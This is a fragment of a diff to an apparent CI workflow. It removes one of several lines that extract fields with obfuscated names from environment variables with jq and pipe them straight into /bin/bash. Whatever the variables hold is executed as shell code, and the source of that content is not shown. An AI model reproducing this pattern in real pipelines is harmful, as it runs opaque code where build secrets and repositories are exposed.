@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$rce8" | jq -r .xggg4 | /bin/bash
           echo $dak25034 | jq -r .dhy71905 | /bin/bash
           echo $cglx61 | jq -r .smsf47295 | /bin/bash
-          echo $vy07348 | jq -r .tnhw612 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
